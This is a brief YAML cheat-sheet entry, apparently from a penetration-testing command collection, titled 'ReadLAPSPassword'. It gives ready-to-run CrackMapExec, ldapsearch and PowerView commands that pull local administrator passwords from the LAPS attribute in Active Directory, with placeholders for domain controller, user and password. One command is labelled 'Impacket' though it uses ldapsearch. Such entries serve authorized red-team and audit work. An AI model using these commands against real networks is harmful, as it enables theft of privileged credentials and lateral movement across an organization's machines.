name: ReadLAPSPassword
description: Read the local administrator password from LAPS
commands:
- '# CrackMapExec'
- crackmapexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --module laps
- ''
- '# Impacket'
- ldapsearch -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b 'DC=domain,DC=local' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
- ''
- '# PowerView'
- Get-DomainComputer -Identity <COMPUTER> -Properties ms-mcs-admpwd
opsec: []
references: []
